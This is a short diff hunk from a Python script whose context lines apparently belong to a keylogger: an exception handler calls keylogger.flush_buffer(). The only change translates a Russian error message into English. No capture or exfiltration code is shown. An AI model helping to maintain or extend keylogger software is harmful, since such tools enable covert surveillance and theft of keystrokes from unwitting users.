@@ -131,4 +131,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         keylogger.flush_buffer()
     except Exception as e:
-        log_manager.write_error(f"Непредвиденная ошибка: {e}")
+        log_manager.write_error(f"Unexpected error: {e}")
